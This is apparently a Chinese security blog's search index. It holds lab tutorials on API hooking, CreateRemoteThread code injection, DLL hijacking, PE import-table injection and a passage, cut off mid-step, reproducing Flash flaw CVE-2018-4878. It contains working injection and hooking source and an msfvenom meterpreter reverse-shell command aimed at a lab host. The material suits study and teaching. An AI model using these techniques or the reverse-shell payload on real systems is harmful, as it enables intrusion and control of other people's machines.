<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[记事本WriteFile() API钩取]]></title>
    <url>%2F2020%2F03%2F30%2F%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96%2F</url>
    <content type="text"><![CDATA[1、调试技术流程具体调试流程如下： 1、对想钩取的进程进行附加操作，使之成为被调试者； 2、“钩子”：将API起始地址的第一个字节修改为0xCC； 3、调用相应API时，控制权转移到调试器； 4、执行需要的操作（操作参数、返回值等）； 5、脱钩：将0xCC恢复原值； 6、运行相应API（无0xCC的正常状态）； 7、“钩子”：再次修改为0xCC（为了继续钩取）； 8、控制器返还被调试者。以上是最简单的情形，在此基础上可以有多种变化。 2、记事本WriteFile() API钩取首先运行Notepad.exe，获取其PID。运行钩取程序（hookdbg.exe）。hookdbg.exe是基于控制台的程序，其运行参数为目标进程的PID，运行hookdbg.exe程序后，就开始了对notepad进程的WriteFile() API的钩取，如图所示。然后在notepad中随意输入一下英文小写字母，如图所示。完成输入后保存，notepad界面中不会有任何变化。关闭notepad，查看hookdbg程序的控制台窗口，如图所示。打开保存的txt文件，查看实际文本是以大写字母形式保存。 3、工作原理WriteFile()定义： 1234567BOOL WriteFile( HANDLE hFile, LPCVOID lpBuffer, //数据缓冲区指针 DWORD nNumberOfBytesToWrote, //要写的字节数 LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped); 使用OllyDbg打开notepad后，在Kernel32!WriteFile() API处设置断点，按（F9）键运行程序。在记事本中输入文本后，以合适的文件名保存，在OllyDbg代码窗口中可以看到，调试器在kernel32!WriteFile()处暂停，然后查看进程，发现当前栈中存在一个返回值，ESP+8中存在数据缓冲区的地址。直接转到数据缓冲区地址处，可以看到要保存到notepad的字符串。钩取WriteFile() API后，用指定字符串覆盖数据缓冲区中的字符串即可达成所愿。 4、源代码分析1、main()12345678910111213141516171819202122int main(int argc, char * argv[])&#123; DWORD dwPID; if(argc != 2) &#123; printf(&quot;\nUSAGE : hookdbg.exe &lt;pid&gt;\n&quot;); return 1; &#125; dwPID = atoi(argv[1]); if(!DebugActiveProcess(dwPID)) &#123; printf(&quot;DebugActiveProcess(%d) failed!!!\n&quot; &quot;Error Code = %d\n&quot;, dwPID, GetLastError()); return 1; &#125; DebugLoop(); return 0;&#125; main()函数以程序运行参数的形式接收要钩取API的进程的PID，然后通过DebugActiveProcess() API将调试器附加到该运行的进程上，开始调试。 123BOOL WINAPI DebugActiveProcess( DWORD dwProcessId); 然后进入DebugLoop()函数，处理来自被调试者的调试事件。 2、DebugLoop()12345678910111213141516171819202122232425262728void DebugLoop()&#123; DEBUG_EVENT de; DWORD dwContinueStatus; //等待被调试者发生事件 while(WaitForDebugEvent(&amp;de, INFINITE)) &#123; dwContinueStatus = DBG_CONTINUE; //被调试进程生成或者附加事件 if(CREATE_PROCESS_DEBUD_EVENT == de.dwDebugEventCode) &#123; OnCreateProcessDebugEvent(&amp;de); &#125; //异常事件 else if( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode ) &#123; if( OnExceptionDebugEvent(&amp;de) ) continue; &#125; //被调试进程终止事件 else if( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode ) &#123; break; &#125; //再次运行被调试者 ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus); &#125;&#125; DebugLoop()函数的工作原理类似于窗口过程函数，它从被调试者处接收事件并处理，然后被调试事件者继续运行。WaitForDebugEvent() API是一个等待被调试者发生调试事件的函数。 1234BOOL WINAPI WaitForDebugEvent( LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds); DebugLoop()函数代码中，若发生调试事件，WaitForDebugEvent() API就会将相关事件信息设置到其第一个参数的变量（DEBUG_EVENT结构体对像），然后立刻返回。 1234567891011121314151617typedef struct _DEBUG_EVENT &#123; // de DWORD dwDebugEventCode; DWORD dwProcessId; DWORD dwThreadId; union &#123; EXCEPTION_DEBUG_INFO Exception; CREATE_THREAD_DEBUG_INFO CreateThread; CREATE_PROCESS_DEBUG_INFO CreateProcessInfo; EXIT_THREAD_DEBUG_INFO ExitThread; EXIT_PROCESS_DEBUG_INFO ExitProcess; LOAD_DLL_DEBUG_INFO LoadDll; UNLOAD_DLL_DEBUG_INFO UnloadDll; OUTPUT_DEBUG_STRING_INFO DebugString; RIP_INFO RipInfo; &#125; u; &#125; DEBUG_EVENT; ContinueDebugEvent() API是一个使被调试者继续运行的函数。 12345678BOOL ContinueDebugEvent(DWORD dwProcessId, // process to continueDWORD dwThreadId, // thread to continueDWORD dwContinueStatus // continuation status); DebugLoop()函数处理三种调试事件，如下所示。 1、EXIT_PROCESS_DEBUG_EVENT 2、CREATE_PROCESS_DEBUG_EVENT 3、EXCEPTION_DEBUG_EVENT3、EXIT_PROCESS_DEBUG_EVENT被调试进程终止时会插发该事件。 4、CREATE_PROCESS_DEBUG_EVENT（OnCreateProcessDebugEvent()）OnCreateProcessDebugEvent()是CREATE_PROCESS_DEBUG_EVENT事件句柄，被调试进程启动时即调用执行该函数。 123456789101112BOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde)&#123; //获取WriteFile() API地址 g_pfWriteFile = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;); //更改第一个字节为0xCC（INT3），originalbyte是g_ch0rgByte备份 memcpy(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_INFO)); ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_OrgByte, sizeof(BYTE), NULL); WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL); return TRUE;&#125; 首先获取WriteFile() API的起始地址，它获取的不是被调试进程的内存地址，而是调试进程的内存地址。对于Windows OS的系统而言，它们在所有进程中都会加载到相同地址。g_cpdi是CREATE_PROCESS_DEBUG_INFO结构体变量。 123456789101112typedef struct _CREATE_PROCESS_DEBUG_INFO &#123; // cpdi HANDLE hFile; HANDLE hProcess; HANDLE hThread; LPVOID lpBaseOfImage; DWORD dwDebugInfoFileOffset; DWORD nDebugInfoSize; LPVOID lpThreadLocalBase; LPTHREAD_START_ROUTINE lpStartAddress; LPVOID lpImageName; WORD fUnicode; &#125; CREATE_PROCESS_DEBUG_INFO; 通过CREATE_PROCESS_DEBUG_INFO结构体的hProcess成员，可以钩取WriteFile() API。由于调试器拥有被调试进程的句柄，所以可以使用ReadProcessMemory()、WriteProcessMemory() API对被调试进程的内存空间自由进行读写操作。通过ReadProcessMemory()读取WriteFile() API的第一个字节，将其保存到g_chOrgByte变量，后面脱钩会用到。然后用WriteProcessMemory() API的第一个字节更改为0xCC，将控制权转移到调试器。 5、EXCEPTION_DEBUG_EVENT（OnExceptionDebugEvent()）OnExceptionDebugEvent()是EXCEPTION_DEBUG_EVENT事件句柄，它处理被调试者的INT3指令。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465BOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde)&#123; CONTEXT ctx; PBYTE lpBuff = NULL; DWORD dwNumOfBytesToWrite, dwAddress; PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExpectionRecord; //断点异常时 if(EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode) &#123; //断点地址为WriteFile() API地址时 if(g_pfWriteFile == per-&gt;ExceptionAddress) &#123; //Unhook，将0xCC恢复为original byte WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL); //获取线程上下文 ctx.ContextFlags = CONTEXT_CONTROL; GetThreadContext(g_cpdi.hThead, &amp;ctx); //获取WriteFile()的param 2、3值，param 2 = ESP + 0x8、param 3 = ESP + 0xC ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), &amp;dwAddrOfBuffer, sizeof(DWORD), NULL); ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp +0xC), &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL); //分配临时缓冲区 lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1); memset(lpBuffer, 0, dwNumOfBytesToWrite+1); //复制WriteFile()缓冲区到临时缓冲区 ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); printf(&quot;\n### original string ###\n%s\n&quot;, lpBuffer); //将小写字母转换为大写字母 for( i = 0; i &lt; dwNumOfBytesToWrite; i++ ) &#123; if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A ) lpBuffer[i] -= 0x20; &#125; printf(&quot;\n### converted string ###\n%s\n&quot;, lpBuffer); //将变换后的缓冲区复制到WriteFile()缓冲区 WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); //释放临时缓冲区 free(lpBuffer); //将线程上下文的EIP更改为WriteFile()的首地址 ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, &amp;ctx); //运行被调试进程 ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE); Sleep(0); //API&quot;钩子&quot; WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL); return TRUE; &#125; &#125; return FALSE;&#125; 1、“脱钩”首先需要“脱钩”，在将小写字母转换为大写字母后需要正常调用WriteFile()函数。 12//Unhook，将0xCC恢复为original byteWriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL); 2、获取线程上下文再次运行先前线程时，必须有运行所需的信息，这些重要信息指的就是CPU中各寄存器的值。通过这些值，才能保证CPU能够再次准确运行它。负责保存CPU寄存器信息的就是CONTEXT结构体，它的定义如下。 123456789101112131415161718192021222324252627282930313233typedef struct _CONTEXT&#123; DWORD ContextFlags // -| +00h DWORD Dr0 // | +04h DWORD Dr1 // | +08h DWORD Dr2 // &gt;调试寄存器 +0Ch DWORD Dr3 // | +10h DWORD Dr6 // | +14h DWORD Dr7 // -| +18h FLOATING_SAVE_AREA FloatSave; //浮点寄存器区 +1Ch~~~88h DWORD SegGs //-| +8Ch DWORD SegFs // |\段寄存器 +90h DWORD SegEs // |/ +94h DWORD SegDs //-| +98h DWORD Edi //________ +9Ch DWORD Esi // | 通用 +A0h DWORD Ebx // | 寄 +A4h DWORD Edx // | 存 +A8h DWORD Ecx // | 器 +ACh DWORD Eax //_|___组_ +B0h DWORD Ebp //++++++ +B4h DWORD Eip // |控制 +B8h DWORD SegCs // |寄存 +BCh DWORD EFlag // |器组 +C0h DWORD Esp // | +C4h DWORD SegSs //++++++ +C8h BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; 下面是获取线程上下文的代码。 12ctx.ContextFlags = CONTEXT_CONTROL;GetThreadContext(g_cpdi.hThead, &amp;ctx); 像这样调用GetThreadContext() API，即可将指定线程的CONTEXT存储到ctx结构体变量。 123456BOOL GetThreadContext(HANDLE hThread, // handle of thread with contextLPCONTEXT lpContext // address of context structure); 3、获取WriteFile()的param2、3的值调用WriteFile()函数时，我们要在传递过来的参数中知道param2（数据缓冲区地址）与param3（缓冲区大小）这两个参数。通过CONTEXT.Esp成员可以分别获得它们的值。 12345//获取WriteFile()的param 2、3值，param 2 = ESP + 0x8、param 3 = ESP + 0xC ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), &amp;dwAddrOfBuffer, sizeof(DWORD), NULL);ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp +0xC), &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL); 4、把小写字母转换为大写字母后覆写WriteFile()缓冲区获取数据缓冲区的地址与大小后，将其内容读到调试器的内存空间，把小写字母转换为大写字母。然后将修改后的大写字母覆写到原位置。 12345678910111213141516171819202122//分配临时缓冲区lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1);memset(lpBuffer, 0, dwNumOfBytesToWrite+1);//复制WriteFile()缓冲区到临时缓冲区 ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL);printf(&quot;\n### original string ###\n%s\n&quot;, lpBuffer);//将小写字母转换为大写字母for( i = 0; i &lt; dwNumOfBytesToWrite; i++ )&#123; if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A ) lpBuffer[i] -= 0x20;&#125;printf(&quot;\n### converted string ###\n%s\n&quot;, lpBuffer);//将变换后的缓冲区复制到WriteFile()缓冲区WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); //释放临时缓冲区free(lpBuffer); 5、把线程上下文的EIP修改为WriteFile()起始地址修改好CONTEXT.Eip成员后，调用SetThreadContext() API。 12//将线程上下文的EIP更改为WriteFile()的首地址ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, &amp;ctx); 6、运行调试进程调用ContinueDebugEvent() API可以重启进程，使之继续运行。7、设置API“钩子”最后设置API“钩子”，方便下次钩取操作。]]></content>
  </entry>
  <entry>
    <title><![CDATA[代码注入]]></title>
    <url>%2F2020%2F03%2F25%2F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1、代码注入代码注入是一种向目标进程插入独立运行代码并使之运行的技术，它一般调用CreateRemoteThread() API以远程线程形式运行插入的代码，所以也被称为线程注入。原理如图所示：首先向目标进程插入代码于=与数据，在此过程中，代码以线程过程（Thread Procedure）形式插入，二代码中使用的数据则以线程参数的形式传入。也就是说，代码与数据是分别注入的。使用代码注入的原因：1、占用内存少如果要注入的代码与数据较少，那么就不需要讲它们做成DLL的形式注入。采用直接代码注入的方式同样能够获得与DLL注入相同的效果，且占用的内存会更少。2、难以查找痕迹采用DLL注入方式会在目标进程的内存中留下相关的痕迹，采用代码注入方式几乎不会留下任何痕迹。DLL注入技术主要用在代码量大且复杂的时候，而代码注入技术则适合用于代码量较少的情况。 2、注入示例1、运行notepad.exe首先运行notepad.exe，然后查看进程的PID，如图所示：2、运行CodeInjection.exe在命令行窗口输入命令与参数（notepad.exe的PID），回车运行：3、弹出消息框notepad.exe进程中弹出一个消息框，如图所示： 3、代码1、main()函数首先看一下main()函数。 1234567891011121314151617181920int main(int argc, char *argv[])&#123; DWORD dwPID = 0; if( argc != 2 ) &#123; printf(&quot;\n USAGE : %s &lt;pid&gt;\n&quot;, argv[0]); return 1; &#125; // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // code injection dwPID = (DWORD)atol(argv[1]); InjectCode(dwPID); return 0;&#125; main()函数用来调用InjectCode()函数，传入的函数参数为目标进程的PID。 2、ThreadProc()函数该函数为注入目标进程的代码（线程函数）。 123456789101112131415161718192021DWORD WINAPI ThreadProc(LPVOID lParam)&#123; PTHREAD_PARAM pParam = (PTHREAD_PARAM)lParam; HMODULE hMod = NULL; FARPROC pFunc = NULL; // LoadLibrary() hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]); // &quot;user32.dll&quot; if( !hMod ) return 1; // GetProcAddress() pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]); // &quot;MessageBoxA&quot; if( !pFunc ) return 1; // MessageBoxA() ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK); return 0;&#125; 上述代码看起来比较复杂，其实等同于 123hMod = LoadLibraryA(&quot;user32.dll&quot;);pFunc = GetProcAddress(hMod, &quot;MessageBoxA&quot;);pFunc(NULL, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;, MB_OK); 从上述代码中的ThreadProc()函数可以看到，函数中并未直接调用相关API，也未直接定义用字符串，它们都是通过THREAD_PARAM结构体以线程参数的形式传递使用。原因在于编译的过程中，编译器将会把调用API的地址写死，但是在目标进程中对应的地址并不一定存在该函数，导致代码不能正常工作。因此我们通过重定义API函数，使其不依赖动态库的调用。 3、InjectCode()函数InjectCode()是代码注入的核心部分，以下是代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091BOOL InjectCode(DWORD dwPID)&#123; HMODULE hMod = NULL; THREAD_PARAM param = &#123;0,&#125;; HANDLE hProcess = NULL; HANDLE hThread = NULL; LPVOID pRemoteBuf[2] = &#123;0,&#125;; DWORD dwSize = 0; hMod = GetModuleHandleA(&quot;kernel32.dll&quot;); // set THREAD_PARAM param.pFunc[0] = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); param.pFunc[1] = GetProcAddress(hMod, &quot;GetProcAddress&quot;); strcpy_s(param.szBuf[0], &quot;user32.dll&quot;); strcpy_s(param.szBuf[1], &quot;MessageBoxA&quot;); strcpy_s(param.szBuf[2], &quot;www.reversecore.com&quot;); strcpy_s(param.szBuf[3], &quot;ReverseCore&quot;); // Open Process if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, // dwDesiredAccess FALSE, // bInheritHandle dwPID)) ) // dwProcessId &#123; printf(&quot;OpenProcess() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; // Allocation for THREAD_PARAM dwSize = sizeof(THREAD_PARAM); if( !(pRemoteBuf[0] = VirtualAllocEx(hProcess, // hProcess NULL, // lpAddress dwSize, // dwSize MEM_COMMIT, // flAllocationType PAGE_READWRITE)) ) // flProtect &#123; printf(&quot;VirtualAllocEx() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !WriteProcessMemory(hProcess, // hProcess pRemoteBuf[0], // lpBaseAddress (LPVOID)&amp;param, // lpBuffer dwSize, // nSize NULL) ) // [out] lpNumberOfBytesWritten &#123; printf(&quot;WriteProcessMemory() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; // Allocation for ThreadProc() dwSize = (DWORD)InjectCode - (DWORD)ThreadProc; if( !(pRemoteBuf[1] = VirtualAllocEx(hProcess, // hProcess NULL, // lpAddress dwSize, // dwSize MEM_COMMIT, // flAllocationType PAGE_EXECUTE_READWRITE)) ) // flProtect &#123; printf(&quot;VirtualAllocEx() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !WriteProcessMemory(hProcess, // hProcess pRemoteBuf[1], // lpBaseAddress (LPVOID)ThreadProc, // lpBuffer dwSize, // nSize NULL) ) // [out] lpNumberOfBytesWritten &#123; printf(&quot;WriteProcessMemory() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !(hThread = CreateRemoteThread(hProcess, // hProcess NULL, // lpThreadAttributes 0, // dwStackSize (LPTHREAD_START_ROUTINE)pRemoteBuf[1], // dwStackSize pRemoteBuf[0], // lpParameter 0, // dwCreationFlags NULL)) ) // lpThreadId &#123; printf(&quot;CreateRemoteThread() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE;&#125; InjectCode()函数的set THREAD_PARAM部分用来设置THREAD_PARAM结构体变量，它们会注入目标进程，并且以参数形式传递给ThreadProc()线程函数。其核心API函数整理如下： 1234567891011OpenProcess()//data : THREAD_PARAMVirtualAllocEx()WriteProcessMemory()//code : ThreadProc()VirtualAllocEx()WriteProcessMemory()CreateRemoteThread() 上述代码主要用来在目标进程中分别为data和code分配内存，并将它们注入进程。最后调用CreteRemoteThread（） API，执行远程线程。 3、调试代码注入是一种向目标进程创建新线程的技术，在OD的Debugging options中将Events设置为Break on new thread。从现在开始，每当notepad.exe进程中生成新线程，调试器就暂停在线程函数开始的代码位置。]]></content>
  </entry>
  <entry>
    <title><![CDATA[输入表]]></title>
    <url>%2F2020%2F03%2F23%2F%E8%BE%93%E5%85%A5%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[1、输入表1.1 输入表结构OriginalFirstThunk和FirstThunk相似，它们分别指向两个本质上相同的数组IMAGE_THUNK_DATA结构。它是一个指针大小的联合体（union）。每个IMAGE_THUNK_DATA元素对应于一个可执行文件输入的函数。具体如下：IMAGRE_IMPORT_BY_NAME结构仅有一个字节大小，存储了一个输入函数的相关信息，结构如下： 1.2 输入地址表OriginalFirstThunk是单独的一项，不可改写，称为INT。FirstThunk是PE装载器重写的。PE装载器首先搜索OriginalFirstThunk，如果找到，加载程序就迭代搜索数组中的每一个指针，找出每一个IMAGRE_IMPORT_NAME结构所指向的输入函数的地址。然后，加载器用真正的入口地址来替代由FirstThunk指向的IMAGE_THUNK_DATA数组里元素的值。因此该表被称为输入地址表（Import Address Table，IAT） 2、一道CTF实例（脱壳后IAT表修复）在这里我们主要讲IAT表，脱壳过程不做讲解。从图中我们可以看出该文件的IAT表是错的。打开OD，右键-&gt;查找-&gt;当前模块中的名称可以看到，该程序第一个调用的为Sleep函数，该函数在PE中的偏移位置为26A4，我们继续查找PE中出现26A4的地方，如图所示：该位置即为IID数组的位置。我们还要找到该程序加载了几个DLL，通过搜索我们可以发现，它调用了KERNEL32.dll（偏移位置27B0）、MSVCP90.dll（偏移位置24D0）、MSVCR90.dll（偏移位置2500）三个DLL。现在我们开始修复IAT表，在2000位置插入然后在空闲位置输入新的IAT表，改变的位置为2800和大小C8。程序成功运行。]]></content>
  </entry>
  <entry>
    <title><![CDATA[DLL注入方法（二）DLL劫持法]]></title>
    <url>%2F2020%2F03%2F19%2FDLL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89DLL%E5%8A%AB%E6%8C%81%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、DLL劫持漏洞原理在Windows系统中，为了节省内存和实现代码重用，微软在Windows操作系统中实现了一种共享函数库的方式。这就是DLL（Dynamic Link Library），即动态链接库，这种库包含了可由多个程序同时使用的代码和数据。每个DLL都有一个入口函数（DLLMain），系统在特定环境下会调用DLLMain。在下面的事件发生时就会调用dll的入口函数： 1.进程装载DLL。 2.进程卸载DLL。 3.DLL在被装载之后创建了新线程。 4.DLL在被装载之后一个线程被终止了。windows xp sp2之后微软为了防止DLL劫持漏洞的产生，在XP SP2之后，添加了一个SafeDllSearchMode的注册表属性。注册表路径如下： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\SafeDllSearchMode当SafeDllSearchMode的值设置为1，即安全DLL搜索模式开启时，查找DLL的目录顺序如下： 1.程序所在目录 2.系统目录即 SYSTEM32 目录。 3.16位系统目录即 SYSTEM 目录。 4.Windows目录。 5.加载 DLL 时所在的当前目录。 6.PATH环境变量中列出的目录。windows 7 以上版本系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs 2、下面我们结合AheadLib工具进行DLL劫持这是劫持前的运行样子： 运行AheadLib.exe，生成.cpp文件，复制下其中的代码，在VC环境中创建DLL项目，将代码粘贴上去，加入一段我们自己的代码： 1MessageBox(NULL,&quot;劫持成功!!!&quot;,TEXT(&quot;DLL Path&quot;),MB_ICONSTOP); 将原MsgDll.dll文件改名为a.dll，编译，生成的.dll文件改名为MsgDll.dll,将MsgDll.dll文件放入到notepad.exe文件目录下，点击运行，可以看到劫持成功。]]></content>
  </entry>
  <entry>
    <title><![CDATA[DLL注入方法（一）通过干预输入表处理过程加载目标DLL]]></title>
    <url>%2F2020%2F03%2F19%2FDLL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89%E9%9D%99%E6%80%81%E4%BF%AE%E6%94%B9PE%E8%BE%93%E5%85%A5%E8%A1%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、静态修改PE输入表法准备工作：一个自行编写的MsgDLL.dll，导出了一个Msg()。修改对象：系统（Windows XP）自带的“记事本”程序notepad.exe。修改目标：启动notepad.exe时能够加载MsgDLL.dll。MsgDLL.dll的主要功能是在DllMain中弹出一个MessageBox来展示自己的存在，代码如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;VOID Msg();DWORD WINAPI ThreadShow(LPVOID lpParameter);void WriteLog(char *info,char *logfilename);BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; if (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123; CreateThread(NULL,0,ThreadShow,NULL,0,NULL); &#125; return TRUE;&#125;DWORD WINAPI ThreadShow(LPVOID lpParameter)&#123; char szPath[MAX_PATH]=&#123;0&#125;; char szBuf[1024]=&#123;0&#125;; GetModuleFileName(NULL,szPath,MAX_PATH); sprintf(szBuf,&quot;Dll已注入到进程 %s [Pid = %d]\n&quot;,szPath,GetCurrentProcessId()); //以三种方式显示自己的存在 //1.控制台 //fprintf((FILE*)GetStdHandle(STD_ERROR_HANDLE),&quot;%s&quot;,szBuf); printf(&quot;%s&quot;,szBuf); //2.调试器 OutputDebugString(szBuf); //3.Msgbox Sleep(800); MessageBox(NULL,szBuf,&quot;Dll Inject&quot;,MB_OK); return 0 ;&#125;void WriteLog(char *info,char *logfilename)&#123; HANDLE hFile; static char tmp[100]; DWORD dwwritten=0; static SYSTEMTIME systime; GetLocalTime(&amp;systime); sprintf(tmp,&quot;%04dd-%02d-%02d %02d:%02d:%02d &quot;,systime.wYear,systime.wMonth,systime.wDay,systime.wHour,systime.wMinute,systime.wSecond); hFile=CreateFile(logfilename,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL); if(INVALID_HANDLE_VALUE!=hFile) &#123; SetFilePointer(hFile,0,0,SEEK_END); WriteFile(hFile,tmp,lstrlen(tmp),&amp;dwwritten,NULL); WriteFile(hFile,info,lstrlen(info),&amp;dwwritten,NULL); WriteFile(hFile,&quot;\r\n&quot;,2,&amp;dwwritten,NULL); CloseHandle(hFile); &#125;&#125;//导出函数VOID Msg()&#123;&#125; （1）备份原IID结构原输入表的RVA为0x7604，它的RawOffset为0x7604 - 0x1000 + 0x400 = 0x6A04，大小为0xC8。增加一个节，将IID数组复制到空白区域，偏移量是0x10400，如图所示。 （2）在原IID区域构建新IID的OriginalFirstThunk、Name和FirstThunk结构 （3）填充新输入表项的IID结构根据刚才填充的两个结构和Name的偏移，填写新的IID项，如图所示。TimeDateStamp这一项我们没有，所以填0。 （4）修正PE文件头的信息1、修改输入表指向的位置以及大小。2、修改新区块的属性。注入成功]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-4878漏洞复现]]></title>
    <url>%2F2019%2F12%2F10%2FCVE-2018-4878%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[1、 引言2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。本文基于Talos文章中给出的样本及360安全卫士团队输出的报告，对相关样本做进一步的解析以丰富相应的技术细节，但是不涉及CVE-2018-4878漏洞的分析。2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。本文基于Talos文章中给出的样本及360安全卫士团队输出的报告，对相关样本做进一步的解析以丰富相应的技术细节，但是不涉及CVE-2018-4878漏洞的分析。2、影响版本Flash Player版本28.0.0.137以及之前的所有版本。3、漏洞复现4.1 漏洞复现环境Kali Linux + Windows 7 sp1 渗透机：Kali Linux 靶机：Windows 7 sp1 EXP：CVE-2018-4878.py Flash：flashplayer_activex_28.0.0.137.exe4.2 复现流程1、准备一台kali虚拟机与一台已关闭防火墙的win7虚拟机。 2、查看两台虚拟机的ip地址 Win7命令行：ipconfig： kali命令行：ifconfig： 3、在Kali Linux中使用msfvenom生成一个Python类型的Shell Code，代码如下： 1msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.36.249 lport=4444 -f python&gt;shellcode.txt lhost为Kali Linux的IP地址，lport为端口号，可以为其他。 4、生成shellcode.txt文件，打开cve-2018-4878.py文件和shellcode.txt文件，将cve-2018-4878.py中的shellcode替换为shellcode.txt中的shellcode。左图为cve-2018-4878.py中的代码，右图为shellcode.txt中的代码，将左图中的代码替换为右图中的代码，并保存更改。 5、修改cve-2018-4878.py中的文件信息，将其更改为自己存放的文件目录名，保存更改。（本人存放于文件CVE-2018-4878-master） 6、Kali Linux进入CVE-2018-4878-master路径，执行命令python cve-2018-4878.py生成exploit.swf和index2.html两个文件。 7、Kali Linux开启Apache2服务，将exploit.swf和index2.html文件复制到/var/www/html目录中。此时，Kali Linux上Web服务器启动，并且具备index2.html整个页面。只要靶机启用Flash插件并且访问该页面，则靶机可直接被控制。 8、Kali 